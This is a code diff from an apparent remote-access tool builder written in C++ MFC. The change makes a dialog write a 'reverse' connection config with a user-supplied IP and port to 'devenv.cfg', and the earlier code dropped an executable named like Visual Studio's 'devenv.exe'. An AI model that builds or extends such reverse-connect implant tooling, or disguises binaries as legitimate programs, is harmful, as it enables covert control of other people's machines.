@@ -5,7 +5,8 @@
 #include "remote_mfc.h"
 #include "afxdialogex.h"
 #include "CreatorDialog.h"
-
+#include "Config.h"
+#include "../common/net/cotp.h"
 
 // CreatorDialog 对话框
 
@@ -24,6 +25,7 @@ CreatorDialog::~CreatorDialog()
 void CreatorDialog::DoDataExchange(CDataExchange* pDX)
 {
 	CDialogEx::DoDataExchange(pDX);
+	DDX_Control(pDX, IDC_EDIT1, m_Edit);
 }
 
 
@@ -49,9 +51,37 @@ void CreatorDialog::OnBnClickedButton1()
 
 	strCurrentPathW = strCurrentPathW.Left(strCurrentPathW.ReverseFind('\\'));
 
-	CStringW exePath = strCurrentPathW + "\\devenv.exe";
-	OutputDebugStringW(exePath);
-	saveFile(L":/raw/x64/devenv.exe", exePath);
+	CStringW configPath = strCurrentPathW + "\\devenv.cfg";
+	
+	//saveFile(L":/raw/x64/devenv.exe", exePath);
+	CONFIG sConfig = { 0 };
+
+	sConfig.type = MODE_REVERSE;
+	int now = time(NULL);
+	sConfig.key = now >> 8;
+
+	CString text;
+	m_Edit.GetWindowText(text);
+
+	int index = text.Find(_T(':'));
+	if (index != -1)
+	{
+		CString left = text.Left(index);
+		CString right = text.Mid(index + 1);
+		/*OutputDebugStringW(left);
+		OutputDebugStringW(right);*/
+		CT2A ipA(left, CP_UTF8);
+		memcpy(sConfig.cconfig.hs[0].szIp, ipA, sizeof(sConfig.cconfig.hs[0].szIp));
+		sConfig.cconfig.hs[0].wPort = _ttoi(right);
+		sConfig.cconfig.hs[0].wFlag = 0;
+		sConfig.cconfig.hs[0].wType = CONN_TYPE_TCP;
+	}
+	CFile file;
+	if (!file.Open(configPath, CFile::modeCreate | CFile::modeWrite)) {
+		return;
+	}
+	file.Write(&sConfig, sizeof(sConfig));
+	file.Close();
 }
 
 bool CreatorDialog::saveFile(CString srcPath, CString newPath)
